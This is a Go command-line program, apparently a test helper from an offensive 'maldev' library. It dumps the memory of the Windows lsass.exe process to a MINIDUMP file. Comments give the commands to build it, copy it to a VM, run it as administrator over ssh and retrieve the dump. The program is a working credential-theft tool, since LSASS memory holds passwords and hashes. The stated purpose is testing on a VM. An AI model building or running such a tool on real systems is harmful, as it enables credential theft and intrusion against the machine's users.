// Command lsass-dump-test is a one-shot helper for the v0.30.0 VM
// validation effort: it runs credentials/lsassdump.DumpToFile against
// the local lsass.exe and writes the resulting MINIDUMP to the path
// supplied via -out.
//
// Build for Windows + run as administrator:
//
//	GOOS=windows GOARCH=amd64 go build -o lsass-dump-test.exe ./cmd/lsass-dump-test
//	scp lsass-dump-test.exe test@vm:lsass-dump-test.exe
//	ssh test@vm 'powershell -Command "Start-Process .\\lsass-dump-test.exe -Verb RunAs -ArgumentList -out=C:\\ProgramData\\lsass.dmp -Wait"'
//	scp test@vm:C:/ProgramData/lsass.dmp ./ignore/lsass-dumps/win10-22h2.dmp
//
// This binary stays under cmd/ so it gets rebuilt with the package
// it tests; the alternative — a build-tag-gated test — would require
// keeping a long-running ssh session open while the test ran on the
// VM, then race a separate scp before the snapshot revert.
package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/oioio-space/maldev/credentials/lsassdump"
)

func main() {
	out := flag.String("out", "lsass.dmp", "output path for the MINIDUMP")
	flag.Parse()

	stats, err := lsassdump.DumpToFile(*out, nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "DumpToFile: %v\n", err)
		os.Exit(2)
	}

	fmt.Printf("OK: regions=%d bytes=%d modules=%d -> %s\n",
		stats.Regions, stats.Bytes, stats.ModuleCount, *out)
}
